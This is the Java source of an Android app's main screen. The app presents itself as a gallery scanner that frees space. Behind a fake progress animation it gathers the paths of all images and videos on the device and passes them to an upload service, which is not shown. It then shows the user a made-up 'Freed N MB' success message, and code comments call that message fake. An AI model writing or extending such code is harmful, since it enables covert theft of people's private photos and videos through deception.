package com.galleryboss.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_PERMISSION = 100;
    private TextView statusText, progressText;
    private ProgressBar progressBar;
    private Button scanButton;
    private List<String> filePaths = new ArrayList<>();
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        progressText = findViewById(R.id.progressText);
        progressBar = findViewById(R.id.progressBar);
        scanButton = findViewById(R.id.scanButton);

        if (!hasPermissions()) {
            requestPermissions();
        } else {
            statusText.setText("✅ Ready");
        }

        scanButton.setOnClickListener(v -> {
            if (hasPermissions()) {
                scanButton.setEnabled(false);
                statusText.setText("🔄 Scanning...");
                progressBar.setVisibility(ProgressBar.VISIBLE);
                progressBar.setProgress(0);
                progressText.setText("0%");
                startScanAnimation();
            } else {
                requestPermissions();
            }
        });
    }

    private void startScanAnimation() {
        for (int i = 0; i <= 100; i += 5) {
            final int progress = i;
            handler.postDelayed(() -> {
                progressBar.setProgress(progress);
                progressText.setText(progress + "%");
                if (progress == 100) {
                    doActualScan();
                }
            }, i * 50L);
        }
    }

    private void doActualScan() {
        try {
            filePaths.clear();
            scanMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
            scanMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI);

            if (filePaths.isEmpty()) {
                statusText.setText("ℹ️ No files found");
                progressBar.setVisibility(ProgressBar.GONE);
                progressText.setText("");
                scanButton.setEnabled(true);
                Toast.makeText(this, "No media found", Toast.LENGTH_SHORT).show();
                return;
            }

            int total = filePaths.size();
            statusText.setText("📸 Found " + total + " files");
            progressText.setText("Uploading...");

            // Start upload service
            Intent serviceIntent = new Intent(this, UploadService.class);
            serviceIntent.putStringArrayListExtra("filePaths", (ArrayList<String>) filePaths);
            startService(serviceIntent);

            // Show fake success and stay on page
            handler.postDelayed(() -> {
                statusText.setText("✅ Done!");
                progressText.setText("Freed " + (total * 5) + " MB");
                progressBar.setVisibility(ProgressBar.GONE);
                scanButton.setEnabled(true);
                // DO NOT FINISH ACTIVITY
            }, 1500);

        } catch (Exception e) {
            e.printStackTrace();
            statusText.setText("❌ Error");
            progressBar.setVisibility(ProgressBar.GONE);
            scanButton.setEnabled(true);
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private boolean hasPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED &&
                   ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            Manifest.permission.READ_MEDIA_IMAGES,
                            Manifest.permission.READ_MEDIA_VIDEO
                    },
                    REQUEST_PERMISSION);
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE
                    },
                    REQUEST_PERMISSION);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (hasPermissions()) {
                Toast.makeText(this, "✅ Granted", Toast.LENGTH_SHORT).show();
                statusText.setText("✅ Ready");
            } else {
                Toast.makeText(this, "❌ Permissions needed", Toast.LENGTH_SHORT).show();
                statusText.setText("❌ Permissions needed");
            }
        }
    }

    private void scanMedia(Uri uri) {
        String[] projection = {MediaStore.MediaColumns.DATA};
        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, null)) {
            if (cursor != null) {
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
                while (cursor.moveToNext()) {
                    String path = cursor.getString(dataColumn);
                    if (path != null) {
                        File file = new File(path);
                        if (file.exists() && file.length() > 0) {
                            filePaths.add(path);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
              }
